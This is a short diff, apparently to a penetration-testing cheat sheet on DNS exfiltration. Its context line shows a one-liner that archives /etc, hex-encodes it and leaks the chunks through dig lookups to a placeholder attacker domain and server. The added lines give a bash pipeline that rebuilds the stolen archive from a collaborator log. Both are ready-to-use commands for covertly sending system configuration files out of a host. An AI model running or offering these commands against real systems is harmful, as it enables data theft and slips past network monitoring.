@@ -122,3 +122,8 @@ Send a compressed tar archive:
 ```
 tar czf - /etc | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
 ```
+
+Decode (using bash):
+```
+grep <DNS Name> collaborator.log| cut -d\[ -f3 | cut -d \. -f1 | tr -d '\n' | xxd -r -p
+```
